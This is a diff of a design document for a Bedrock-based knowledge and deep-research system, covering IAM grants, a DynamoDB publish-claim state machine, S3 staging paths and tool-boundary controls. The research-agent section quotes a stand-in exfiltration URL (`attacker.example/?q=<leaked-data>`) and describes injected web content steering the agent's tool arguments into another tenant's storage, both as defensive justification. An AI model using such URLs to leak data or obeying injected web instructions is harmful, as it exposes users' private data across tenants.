@@ -90,8 +90,11 @@ The implementation reuses the current stacks and storage:
   stacks:
   - `TtobakAiStack` owns `crawlerRole` (`kbBucket.grantReadWrite`, bucket-wide,
     unchanged) — adds a prefix-scoped `knowledge-artifacts/*` grant and
-    `bedrock:InvokeModel` on the selected inference profile + destination-Region
-    foundation-model ARN.
+    `bedrock:InvokeModel` on the selected inference profile **and every
+    destination-Region foundation-model ARN it can route to** — a `us.` geo
+    profile spans multiple Regions, so a single ARN under-grants and causes a
+    runtime `AccessDenied` depending on which Region it routes to. The
+    destination-Region set is a CDK config list, not a single value.
   - `TtobakCrawlerStack` (currently only `props.kbBucket` + `SUMMARIZE_MODEL_ID`)
     adds the assets-bucket reference/env var, plus `FINAL_MODEL_ID` and the Bedrock
     client Region (§7.1) — not wired in today.
@@ -454,16 +457,20 @@ SK: STATE
 schemaVersion: number
 kind: string
 canonicalUrl: string
-publishedContentHash: string?   # last PUBLISHED version; absent for a new doc
-candidateContentHash: string?   # in-flight claim; absent when PUBLISHED
+primarySourceId: string         # set once at first claim; immutable — the {sourceId}
+                                 # segment in staged/promoted keys never changes owner
+service: string?                # kind=technical only; the {service} promoted-key segment
+publishedContentHash: string?   # last PUBLISHED version; absent if never published
+candidateContentHash: string?   # in-flight claim; absent when idle/PUBLISHED
 qualityStatus: "ENRICHING" | "PROMOTING" | "PUBLISHED"
-claimedAt: string?              # set on claim; cleared on PUBLISHED or rejection
+claimedAt: string?              # set on claim; also the staging-key attempt token (fencing)
 promotingAt: string?
+postPublishPending: bool?       # set with step 7d; cleared after step 8-9 succeed
 lastRejectedContentHash: string?
 lastRejectedReason: string?
 lastRejectedAt: string?
 discoveredBySourceIds: String Set
-artifactKey: string
+artifactKey: string             # promoted JSON copy (§17.2 long-term, not the staging path)
 s3Key: string
 qualityScore: number
 qualityGateVersion: string
@@ -502,75 +509,103 @@ The per-source row is written only by the fan-out step (step 8) after a canonica
 promote succeeds — it's never itself a claim target, so it needs no
 `ENRICHING`/`PROMOTING` state.
 
-**Per-kind KB prefix mapping** (`docHash` is source-independent; the promoted key
-layout is not):
+**Per-kind KB prefix mapping**, using `primarySourceId`/`service`, never the
+discovering source of any later refresh:
 
-| `kind`      | Promoted KB key                          |
-|-------------|-------------------------------------------|
-| `news`      | `shared/news/{sourceId}/{docHash}.md`      |
-| `technical` | `shared/aws-docs/{service}/{docHash}.md`   |
+| `kind`      | Promoted KB key                              |
+|-------------|-------------------------------------------------|
+| `news`      | `shared/news/{primarySourceId}/{docHash}.md`      |
+| `technical` | `shared/aws-docs/{service}/{docHash}.md`          |
 
-`technical`'s second segment is `service`, not `sourceId` — a new `kind` must add
-its own row here before being phased on.
+A new `kind` must add its own row here before being phased on.
 
 `summary` stays for backward-compatible list responses (capped, now substantive).
 The full structured object and canonical Markdown are staged at a
-content-hash-versioned key in the **assets** bucket — never the KB bucket, since
-the out-of-band Bedrock data source has no inclusion prefix (§4) and scans the
-whole bucket:
+**fenced** key in the **assets** bucket — content-hash *and* claim-attempt
+(`claimedAt`) versioned, never the KB bucket (the out-of-band Bedrock data source
+has no inclusion prefix, §4, and scans the whole bucket):
 
 ```text
-s3://ttobak-assets-{account}/knowledge-artifacts/{kind}/{sourceId}/{docHash}/{contentHash}.json
-s3://ttobak-assets-{account}/knowledge-artifacts/{kind}/{sourceId}/{docHash}/{contentHash}.md
+s3://ttobak-assets-{account}/knowledge-artifacts/staging/{kind}/{primarySourceId}/{docHash}/{contentHash}-{claimedAt}.json
+s3://ttobak-assets-{account}/knowledge-artifacts/staging/{kind}/{primarySourceId}/{docHash}/{contentHash}-{claimedAt}.md
 ```
 
-**Publication is single-writer, decided before enrichment runs** — deciding only at
-promotion time doesn't work, since Opus's non-deterministic output means two
-workers enriching the identical `contentHash` could produce two different
-artifacts racing for the same staging key. All conditional updates target the
-canonical row:
+The promoted JSON copy (what `artifactKey` on the row points to) lives under a
+separate, non-expiring prefix — `knowledge-artifacts/promoted/{kind}/
+{primarySourceId}/{docHash}.json` — so §17.2's 7-day lifecycle rule can target
+`knowledge-artifacts/staging/` only, without also expiring the reference the row
+keeps forever.
+
+The `-{claimedAt}` suffix fences concurrent attempts: two claims for the same
+`contentHash` (a slow original worker plus a reconciler that reclaimed the lease)
+get different `claimedAt` values and therefore different keys, so neither can
+silently overwrite the other's artifact. Promote (step 7) copies exactly the key
+recorded for the claim that reached `PROMOTING` — never "the `{contentHash}` key"
+generically.
+
+**Publication is single-writer, decided before enrichment runs.** Deciding only at
+promotion time doesn't work: Opus's non-deterministic output means two workers
+enriching the identical `contentHash` could produce different artifacts. All
+conditional updates target the canonical row:
 
 1. Fetch, normalize, compute `contentHash`. If this `sourceId` has no per-source
-   row yet, add it to `discoveredBySourceIds` and (if canonical is `PUBLISHED`)
-   upsert its per-source row from the current published state — a second source
-   finding an already-published doc isn't a content change but still needs its own
-   row. If `contentHash == publishedContentHash`, stop (§8.2 step 3).
+   row yet, add it to `discoveredBySourceIds` and, if canonical is `PUBLISHED`
+   **and** `publishedContentHash` exists (genuinely published, not idle-after-
+   rejection), upsert its per-source row from the current published state. If
+   `contentHash == publishedContentHash`, stop (§8.2 step 3).
 2. **Claim**: conditional update requiring `qualityStatus = PUBLISHED` AND
-   `publishedContentHash <> contentHash` (or no row yet) → sets
-   `candidateContentHash`, `qualityStatus: ENRICHING`, `claimedAt: now`. Losers
-   stop immediately, before calling Opus.
-3. Winner calls Opus, stages JSON + Markdown at the `{contentHash}` keys.
+   `(attribute_not_exists(publishedContentHash) OR publishedContentHash <>
+   contentHash)` — the explicit `attribute_not_exists` branch matters: DynamoDB's
+   `<>` against a missing attribute evaluates false, so a doc whose only attempt
+   was ever rejected (no `publishedContentHash` set) would otherwise never be
+   claimable again. On success: `candidateContentHash`, `qualityStatus: ENRICHING`,
+   `claimedAt: now`; if no row exists yet, also set `primarySourceId` to this
+   worker's `sourceId` (immutable from here on). Losers stop before calling Opus.
+3. Winner calls Opus, stages JSON + Markdown at the `{contentHash}-{claimedAt}`
+   keys.
 4. **Quality gate** (§7.2) runs.
 5. **Pass**: `ENRICHING -> PROMOTING`, conditioned on
    `candidateContentHash`/`claimedAt` → promote (step 7).
 6. **Fail**: `ENRICHING -> PUBLISHED` (rollback, `publishedContentHash` untouched),
    set `lastRejected*`. A repeat fetch of the same rejected `contentHash` within a
    cooldown (e.g. 24h) skips re-claiming.
-7. **Promote** (self-correcting loop, since a resumed promote must never overwrite
-   a newer version):
-   a. Read current `candidateContentHash` (`H`).
-   b. `CopyObject` staged Markdown for `H` to the KB-bucket key.
-   c. Re-read; if `candidateContentHash != H`, repeat from (a) with the new value.
-   d. `PROMOTING -> PUBLISHED`, `publishedContentHash: H`, conditioned on
-      `candidateContentHash == H`; retry from (a) on conflict.
+7. **Promote** (self-correcting loop — a resumed promote must never overwrite a
+   newer version):
+   a. Read current `candidateContentHash`/`claimedAt` (`H`/`A`).
+   b. `CopyObject` the fenced key `{H}-{A}` to the KB-bucket key, and the
+      structured-JSON fenced key to the promoted `artifactKey` (also long-term,
+      not the 7-day staging path — see §17.2).
+   c. Re-read; if `candidateContentHash`/`claimedAt` no longer match `H`/`A`,
+      repeat from (a) with the new values.
+   d. `PROMOTING -> PUBLISHED`, `publishedContentHash: H`,
+      `postPublishPending: true`, clearing `candidateContentHash`/`claimedAt`/
+      `promotingAt`, conditioned on `candidateContentHash == H`;
+      retry from (a) on conflict.
 8. **Fan out**: upsert every `discoveredBySourceIds` row with the published
    summary/`keyTakeaways`/`qualityStatus`/`s3Key`.
-9. Trigger KB ingestion.
+9. Trigger KB ingestion, then clear `postPublishPending`.
 
 A row stuck in `ENRICHING`/`PROMOTING` past a short lease (e.g. 10 minutes, same
 pattern as §11.3's `CLAIMED` reclaim) means the claim holder crashed.
 Reconciliation renews the lease (`claimedAt: old -> now`, conditioned on the stale
-value) before acting, so a merely-slow original worker loses its own subsequent
-writes:
+value) before acting — this also mints a fresh fencing token, so the original
+worker's now-orphaned staging write (if it still lands) never gets promoted:
 
 - **Stuck `ENRICHING`**: bodies aren't retained (§6.3) and SHA-256 is one-way, so
   reconciliation must re-fetch and re-verify `contentHash` against
   `candidateContentHash` before redoing enrichment; on mismatch, roll back (as
   step 6, no rejection reason) and let the next fetch claim fresh.
 - **Stuck `PROMOTING`**: re-enter the promote loop (step 7) — already idempotent.
+- **`postPublishPending: true` past the same lease, regardless of `qualityStatus`**:
+  re-run steps 8-9 for that row. This is not a live claim (no lease conflict to
+  guard) — a crash between step 7d's commit and step 9's ingestion trigger would
+  otherwise be permanently invisible to reconciliation (the row is already
+  `PUBLISHED`, and the next fetch's step 1 stops immediately on matching
+  `contentHash`), so this flag is swept independently of the `ENRICHING`/
+  `PROMOTING` lease checks above.
 
-Staged keys get a short lifecycle (e.g. 7 days, assets bucket); only the promoted
-`shared/` copy is long-term (§17.2).
+Staged keys get a short lifecycle (e.g. 7 days, assets bucket); the promoted
+`shared/` Markdown and `artifactKey` JSON copies are long-term (§17.2).
 
 ### 9.2 Run history
 
@@ -777,9 +812,11 @@ When the user approves a research plan, the backend snapshots:
 - selected accounts/projects,
 - selected source policy.
 
-The snapshot is stored as `approvedPlan`, hashed, and passed to the execute request.
-Execution must follow that exact snapshot. Later chat messages do not silently alter
-an already-running job.
+The snapshot is stored as `approvedPlan`, hashed, and passed to the execute request
+— the Step Functions payload carries only the hash, same as §12.2's prep-packet
+boundary; the worker loads the actual body from DynamoDB. Execution must follow
+that exact snapshot. Later chat messages do not silently alter an already-running
+job.
 
 A snapshot doesn't confer standing access at execution time — the backend
 re-verifies server-side, before execution and before each stage touching a
@@ -790,11 +827,22 @@ closed.
 Deep research is a single iterative agentic loop (`web_search`/`fetch_page`/
 `save_report`), so unlike the prep packet (§12.2) it can't split into a
 public-then-synthesis call — the same reasoning that picks the next search has
-`approvedPlan`'s internal context in its window. The enforcement point is
-therefore the tool boundary: every `web_search`/`fetch_page` query argument is
+`approvedPlan`'s internal context in its window. `web_search` query arguments are
 checked server-side against §6.1's approved-alias/generic-topic allowlist before
-dispatch — a deterministic value check, not a prompt instruction. §7.1's residency
-flag applies here too.
+dispatch. That check does not cover `fetch_page`: a URL's query string, path, and
+even destination host are an exfiltration channel an alias-token match doesn't
+catch (`https://attacker.example/?q=<leaked-data>` can pass an alias check while
+still leaking arbitrary text). `fetch_page` therefore only accepts an opaque
+reference to a URL `web_search` itself already returned in this session — never a
+raw model-supplied URL — with the same provenance check re-applied to any
+redirect target. §7.1's residency flag applies to this whole path too.
+
+`save_report`'s `researchId`/owner are derived from the job's own verified
+execution context (the record created when the job started), never from the
+model-supplied tool-call arguments — a model that ingested untrusted web content
+could otherwise be steered into writing to another tenant's `research/{userId}/`
+via a manipulated tool argument. The write is a conditional update against the
+canonical research row's existing owner.
 
 The tool layer records a source manifest for every successful `web_search` and
 `fetch_page`. `save_report` computes unique source count and word count itself; it
@@ -893,9 +941,12 @@ Phase 1:
 1. **Redirect all three writers** to the owner-scoped keys above — otherwise
    backlog remediation just gets refilled by the same code. Deploys:
    `TtobakGatewayStack` (`research.go`); `TtobakResearchAgentStack` (grant
-   `research/*` on the assets bucket to `toolsRole`, swap `save_report.py`'s env
-   var); a `deploy-research-agent.yml` run with the equivalent for the AgentCore
-   container.
+   `research/*` on the assets bucket to `toolsRole`, remove its now-unneeded
+   `shared/research/*` grant, swap `save_report.py`'s env var). The AgentCore
+   Runtime container's IAM comes from `TtobakAiStack`'s `fromRoleArn` import of
+   `ttobak-agentcore-research-role` (CLAUDE.md) — `deploy-research-agent.yml`
+   only consumes that role via `--role-arn`, it does not attach policy, so the
+   `research/*` grant for this writer is an `AiStack` change, not a workflow run.
 2. **Migrate the backlog** to owner-scoped storage (or confirm/keep only
    public-material reports).
 3. **Clear the vector index** — deleting/moving S3 objects doesn't remove
@@ -1097,7 +1148,8 @@ and failover are a separate higher-tier requirement.
 - Both assets and KB buckets remain versioned. Two separate controls, different
   buckets/stacks:
   - **Assets bucket** (`TtobakStorageStack`): 7-day lifecycle on
-    `knowledge-artifacts/` staging paths (§9.1) — deployable now.
+    `knowledge-artifacts/staging/` only (§9.1) — the promoted `knowledge-artifacts/
+    promoted/` copy is excluded and long-term. Deployable now.
   - **KB bucket** (`TtobakKnowledgeStack`): 35-day noncurrent retention on the
     promoted copies — blocked until `TtobakKnowledgeStack` is deployable again
     (staged KB teardown, CLAUDE.md Known Issues); versioning alone covers the
@@ -1198,8 +1250,9 @@ No text, control, badge, diagram, or table may overlap or expand a fixed control
 - Remediate existing `shared/research/` exposure (§12.4), all three parts:
   redirect all three writers — `research.go` (`TtobakGatewayStack`),
   `save_report.py` (`TtobakResearchAgentStack`), and the AgentCore Runtime
-  container (`deploy-research-agent.yml`) — to owner-scoped storage, migrate the
-  already-published backlog, and re-run KB ingestion to clear already-indexed
+  container (IAM via `TtobakAiStack`'s existing role import) — to owner-scoped
+  storage, migrate the already-published backlog, and re-run KB ingestion to
+  clear already-indexed
   vectors. This is independent of Phase 4's research/prep *features* — it fixes a
   pre-existing exposure, not a Phase 4 regression, so it does not wait for Phase 4,
   even though it touches stacks/pipelines Phase 1's other bullets don't otherwise
